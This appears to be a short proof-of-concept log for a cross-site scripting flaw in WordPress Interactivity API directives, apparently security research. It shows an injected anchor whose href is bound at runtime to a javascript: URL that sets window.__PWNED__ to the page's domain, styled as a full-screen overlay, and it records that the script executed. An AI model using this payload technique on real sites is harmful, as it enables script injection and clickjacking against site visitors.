@@ -1,0 +1,7 @@
+stored directives: ['data-wp-interactive', 'data-wp-context', 'data-wp-bind--href', 'data-wp-bind--style']
+server anchor      : <a id="pwnlink" data-wp-bind--href="context.u" data-wp-bind--style="context.s">
+server wrote href= : False
+runtime on page    : True
+DOM href           : "javascript:window.__PWNED__=document.domain;void 0"
+DOM style          : "position: fixed; inset: 0px; z-index: 2147483647; display: block;"
+executed           : "localhost"
